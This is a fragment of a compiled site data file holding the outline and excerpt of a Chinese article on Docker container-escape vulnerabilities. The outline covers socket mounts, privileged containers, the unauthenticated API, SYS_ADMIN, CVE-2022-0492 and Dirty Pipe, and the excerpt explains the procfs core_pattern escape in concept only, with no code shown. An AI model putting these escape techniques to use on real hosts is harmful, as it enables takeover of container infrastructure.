Socket逃逸","slug":"挂载docker-socket逃逸","link":"#挂载docker-socket逃逸","children":[{"level":3,"title":"环境","slug":"环境-1","link":"#环境-1","children":[]},{"level":3,"title":"检测","slug":"检测","link":"#检测","children":[]},{"level":3,"title":"利用","slug":"利用-1","link":"#利用-1","children":[]}]},{"level":2,"title":"特权容器逃逸","slug":"特权容器逃逸","link":"#特权容器逃逸","children":[{"level":3,"title":"环境","slug":"环境-2","link":"#环境-2","children":[]},{"level":3,"title":"检测","slug":"检测-1","link":"#检测-1","children":[]},{"level":3,"title":"利用","slug":"利用-2","link":"#利用-2","children":[]},{"level":3,"title":"骚姿势","slug":"骚姿势","link":"#骚姿势","children":[]}]},{"level":2,"title":"远程API未授权访问逃逸","slug":"远程api未授权访问逃逸","link":"#远程api未授权访问逃逸","children":[{"level":3,"title":"环境","slug":"环境-3","link":"#环境-3","children":[]},{"level":3,"title":"检测","slug":"检测-2","link":"#检测-2","children":[]},{"level":3,"title":"利用","slug":"利用-3","link":"#利用-3","children":[]}]},{"level":2,"title":"SYS_Admin容器逃逸","slug":"sys-admin容器逃逸","link":"#sys-admin容器逃逸","children":[{"level":3,"title":"条件","slug":"条件","link":"#条件","children":[]},{"level":3,"title":"环境","slug":"环境-4","link":"#环境-4","children":[]},{"level":3,"title":"检测","slug":"检测-3","link":"#检测-3","children":[]},{"level":3,"title":"利用","slug":"利用-4","link":"#利用-4","children":[]}]},{"level":2,"title":"CVE-2022-0492","slug":"cve-2022-0492","link":"#cve-2022-0492","children":[{"level":3,"title":"条件","slug":"条件-1","link":"#条件-1","children":[]},{"level":3,"title":"环境","slug":"环境-5","link":"#环境-5","children":[]},{"level":3,"title":"利用","slug":"利用-5","link":"#利用-5","children":[]}]},{"level":2,"title":"CVE-2022-0847(脏管道逃逸)","slug":"cve-2022-0847-脏管道逃逸","link":"#cve-2022-0847-脏管道逃逸","children":[{"level":3,"title":"条件","slug":"条件-2","link":"#条件-2","children":[]},{"level":3,"title":"环境","slug":"环境-6","link":"#环境-6","children":[]},{"level":3,"title":"检测","slug":"检测-4","link":"#检测-4","children":[]},{"level":3,"title":"利用","slug":"利用-6","link":"#利用-6","children":[]}]}],"git":{"createdTime":1736966462000,"updatedTime":1736966462000,"contributors":[{"name":"uu2fu3o","username":"uu2fu3o","email":"1027578439@qq.com","commits":1,"url":"https://github.com/uu2fu3o"}]},"readingTime":{"minutes":9.66,"words":2898},"filePathRelative":"云/Docker/Docker漏洞汇总.md","localizedDate":"2025年1月16日","excerpt":"\\n<h2>Docker容器挂载 (伪文件系统)procfs 逃逸</h2>\\n<p><code>procfs</code>是一个伪文件系统，它动态反映着系统内进程及其他组件的状态，其中有许多十分敏感重要的文件。因此，将宿主机的procfs挂载到不受控的容器中也是十分危险的，尤其是在该容器内默认启用root权限，且没有开启User Namespace时(Docker默认是不会做用户隔离)。</p>\\n<p>利用文件<code>/proc/sys/kernel/core_pattern</code>它在Linux系统中，如果进程崩溃了，系统内核会捕获到进程崩溃信息，将进程崩溃信息传递给这个文件中的程序或者脚本。</p>","autoDesc":true}');export{d as comp,k as data};
